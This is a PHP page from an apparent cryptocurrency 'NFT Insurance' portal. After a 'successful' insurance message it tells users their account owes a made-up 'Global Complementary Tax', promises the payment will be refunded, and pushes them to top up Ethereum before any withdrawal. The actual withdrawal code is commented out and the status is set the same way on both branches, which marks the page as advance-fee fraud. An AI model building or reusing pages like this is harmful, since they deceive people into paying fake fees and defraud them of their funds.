<?php
$pageName = 'deposit';

include_once "portal_settings.php";

$max_limit = $userCl->getCurrLimit();
$withdraw_by = $currUser->id;
$status = 0;

if (isset($_POST['withdraw_funds'])) {
    print_r($_POST);

    $network_fee = $_POST['network_fee'];

    if ($network_fee < 1) {
        $status = 1;
    } else {
        $status = 1;
    }
}

// $sql = "INSERT INTO `account_withdraw`(`amount`, `wallet_addr`, `type`, `method`, `withdraw_by`, `time_withdrawn`) VALUES (:am, :wa, :tp, :md, :wb, :tw)";
// $statement = $pdo->prepare($sql);
// $statement->bindParam(':am', $amount);
// $statement->bindParam(':wa', $wallet_addr);
// $statement->bindParam(':tp', $type);
// $statement->bindParam(':md', $method);
// $statement->bindParam(':wb', $withdraw_by);
// $statement->bindParam(':tw', $time_created);
// if ($statement->execute() && $activityCl->userWithdrawal($currUser->id, $refId, $method, $amount)) {
//     echo '
//            <script>
//          swal({
//                title: "Request Sent",
//                text: " Once approved by an admin, a sum of ' . $amount . ' ETH will be  withdrawn from your account",
//                icon: "success",
//                button: "Redirecting...",
//              });
//          </script>
//      ';
//     header('refresh: 2; payout');
// } else {
//     echo '
//            <script>
//          swal({
//                title: "Oops!",
//                text: "An error occured, kindly try again",
//                icon: "warning",
//                button: "Ok",
//              });
//          </script>
//      ';
// }
?>

<style>
    .btn_div {
        position: absolute;
        left: 50%;
        right: 50%;
        transform: translate(-50%, 0);
        bottom: 0;
        width: 90%;
    }

    .swal-content {
        text-align: center;
        background-color: #FEFAE3;
        padding: 17px;
        border: 1px solid #F0E1A1;
        color: #61534e;
    }
</style>

<div class="row">
    <div class="col-12 grid-margin stretch-card">
        <div class="card" style="height: 93vh">
            <div class="page-header pt-5 px-md-5 px-3">

                <nav aria-label="breadcrumb">

                </nav>

            </div>
            <h6 class="text-center"><b>NFT Insurance</b></h6>
            <div class="card-body table__container">

                <h1 class="text-center mb-5" style="font-size: 1.2rem;">
                    <b style="    background: #00800063;
    padding: 10px 20px;
    border-radius: 5px;
    border: 1px solid green;">
                        <i class="mdi mdi-check-decagram"></i>

                        Insurance Successful
                    </b>
                </h1>


                <div class="transac_details mb-3">
                    <div class="row p-3 mb-5" style="background: #f0f0f0; border-radius: 5px">
                        <p style="font-size: 14px;">
                            <span style="display: block;
    text-align: center;
    font-size: 70px;
    color: #4f5863;"> <i class="mdi mdi-alert-circle ms-1 "></i>
                            </span>

                            This is an automated message to inform you that your account is due to tax verification, in compliance to international financial regulations based on Global Complementary Tax (annual rates)
                            <br> <br>
                            In the Global complementary tax reads with this payment clears your cryptocurrency of any outstanding taxes and fees hearevy making it available to process your withdrawal as this is the last before your withdrawal will be processed
                        <p>
                            <b> Note: This is strictly for Tax purposes and would be refunded after the process</b>
                        </p>
                        </p>

                    </div>

                </div>

                <div class="btn_div">
                    <p style="background: #f0f0f0;padding: 10px;border-radius: 5px; font-weight: 600; font-size: 14px;display: none;" class="text-danger mb-0 network_warning">
                        <i class="mdi mdi-alert-circle"></i>
                        You don't have enough Ethereum (ETH) to cover for Tax Fees, Tax Costs <?= $userCl->getTaxFee() ?>ETH
                    </p>
                    <input type="number" name="network_fee" id="network_fee" value="<?= $currUser->mint_balance ?>" hidden>
                    <button class="btn btn-primary btn-rounded btn-lg p-3 withdraw_insurance" id="<?= $currUser->balance ?>" style="margin: 30px 0;" type="button"><b>Proceed to Tax Payment</b></button>
                </div>
            </div>


        </div>
    </div>

</div>


<!-- end footer-section -->
<!-- end page-wrap -->

<script>
    document.body.addEventListener('click', (e) => {
        if (e.target.id == 'withdraw_insurance') {
            window.location.href = "deposit";
        }
    })

    $('.withdraw_insurance').click((e) => {
        var fee = e.currentTarget.id;

        $.ajax({
            url: 'getdata.php',
            type: 'POST',
            data: {
                tax_fee: fee
            },
            success: function(response) {

                if (response) {
                    // $('.network_warning').show();
                    document.querySelector('.network_warning').style.display = 'block';
                    document.querySelector('.withdraw_insurance').innerHTML = 'Top-up Ethereum (ETH)';
                    document.querySelector('.withdraw_insurance').setAttribute('id', 'withdraw_insurance');
                    document.querySelector('.withdraw_insurance').classList.remove('withdraw_insurance');

                } else {
                    $.ajax({
                        url: 'getdata.php',
                        type: 'POST',
                        data: {
                            tax_fee_withdrawal: fee,
                            userId: <?= $currUser->id ?>
                        },
                        success: function(data) {
                            if (data) {
                                swal({
                                    title: "Request Sent",
                                    text: " Once approved by an admin, The requested amount would be withdrawn from your account",
                                    icon: "success",
                                    button: "Ok",
                                }).then(() => {
                                    window.location.href = "payout";
                                });
                            } else {
                                alert('An error occurred, kindly try again');
                            }
                        }
                    });

                }
            }
        })
    })
</script>
<?php require_once 'portal_footer.php' ?>